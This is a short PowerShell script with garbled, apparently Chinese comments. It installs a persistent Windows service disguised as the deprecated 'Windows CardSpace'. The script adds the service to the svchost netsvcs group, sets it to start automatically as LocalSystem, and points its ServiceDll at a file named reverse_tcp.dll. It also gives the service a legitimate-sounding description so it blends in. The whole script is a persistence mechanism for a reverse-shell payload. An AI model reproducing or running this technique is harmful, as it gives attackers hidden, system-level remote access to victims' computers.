# ����Ҫ��ӵ���ֵ
$newValue = "CardSpace"

# ��ȡ��ǰ�Ķ��ַ���ֵ
$currentValue = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" -Name "netsvcs"

# ����ֵ��ӵ�ԭ��ֵ��ĩβ
if ($currentValue -ne $null) {
    $currentValue.netsvcs += $newValue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" -Name "netsvcs" -Value $currentValue.netsvcs
}
# ���� Windows CardSpace ����
sc.exe create CardSpace binpath= "%SystemRoot%\system32\svchost.exe -k netsvcs" start= auto obj= LocalSystem

# ���÷���� ServiceDll ע�����
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\CardSpace\Parameters" -Name ServiceDll -Value "%SystemRoot%\System32\reverse_tcp.dll"

# ���÷���� Description ע�����
$description = "Windows CardSpace is a technology designed to provide secure identity authentication and credential management. It allows users to create and manage digital identities for secure access to online resources and authentication. Windows CardSpace helps protect users' personal information and credentials by offering trusted authentication methods. However, this technology has been deprecated in newer versions of Windows in favor of more modern identity authentication and credential management methods. Therefore, the Windows CardSpace service is no longer provided."
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\CardSpace" -Name Description -Value $description

# ���÷���� DisplayName ע�����
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\CardSpace" -Name DisplayName -Value "Windows CardSpace"

